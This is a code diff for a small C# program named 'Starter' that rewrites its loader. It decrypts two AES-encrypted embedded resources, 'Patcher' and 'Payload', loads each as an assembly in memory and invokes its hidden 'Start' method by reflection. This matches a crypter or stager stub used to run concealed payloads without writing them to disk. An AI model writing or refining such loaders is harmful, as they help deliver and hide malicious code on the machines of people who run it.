@@ -10,30 +10,7 @@ namespace Starter
 {
     internal class Entry
     {
-        private static RijndaelManaged encoder;
-        private static void InitDecoder()
-        {
-            var secretKey = Properties.Resources.Key;
-            var bytes = Encoding.UTF8.GetBytes(secretKey);
-
-            byte[] key = bytes.Take(32).ToArray();
-            byte[] iv = bytes.Take(16).ToArray();
-
-            RijndaelManaged rijndael = new RijndaelManaged();
-            rijndael.KeySize = 256;
-            rijndael.BlockSize = 128;
-            rijndael.Key = key;
-            rijndael.IV = iv;
-            rijndael.Padding = PaddingMode.PKCS7;
-
-            encoder = rijndael;
-        }
-
-        private static byte[] Decrypt(byte[] src)
-        {
-            byte[] decryptedBytes = encoder.CreateDecryptor().TransformFinalBlock(src, 0, src.Length);
-            return decryptedBytes;
-        }
+       
 
         static void Main(string[] args)
         {
@@ -46,18 +23,36 @@ namespace Starter
             Console.WriteLine("Running Decoder.");
 #endif
 
+            var asm = Decrypt(Encoding.UTF8.GetString(Properties.Resources.Patcher), Properties.Resources.PatchKey);
+            Execute(asm);
+            asm = Decrypt(Encoding.UTF8.GetString(Properties.Resources.Payload), Properties.Resources.Key);
+            Execute(asm);
+        }
 
+        private static byte[] Decrypt(string b64, string secretKey)
+        {
+            var src = Convert.FromBase64String(b64);
+            var bytes = Encoding.UTF8.GetBytes(secretKey);
 
-            InitDecoder();
-            var b64 = Encoding.UTF8.GetString(Properties.Resources.Payload);
-            var asm = Decrypt(Convert.FromBase64String(b64));
+            byte[] key = bytes.Take(32).ToArray();
+            byte[] iv = bytes.Take(16).ToArray();
 
-            var assembly = System.Reflection.Assembly.Load(asm);
+            RijndaelManaged rijndael = new RijndaelManaged();
+            rijndael.KeySize = 256;
+            rijndael.BlockSize = 128;
+            rijndael.Key = key;
+            rijndael.IV = iv;
+            rijndael.Padding = PaddingMode.PKCS7;
+
+            byte[] decryptedBytes = rijndael.CreateDecryptor().TransformFinalBlock(src, 0, src.Length);
+            return decryptedBytes;
+        }
+
+        private static void Execute(byte[] assemblyBytes)
+        {
+            var assembly = System.Reflection.Assembly.Load(assemblyBytes);
             var method = assembly.GetTypes().First(t => t.Name ==  "Entry").GetMethod("Start", BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
             method.Invoke(null, new object[] { });
-
-            //var assembly = System.Reflection.Assembly.Load(asm);
-            //assembly.EntryPoint.Invoke(null, new object[] { new string[] { } });
         }
     }
 }
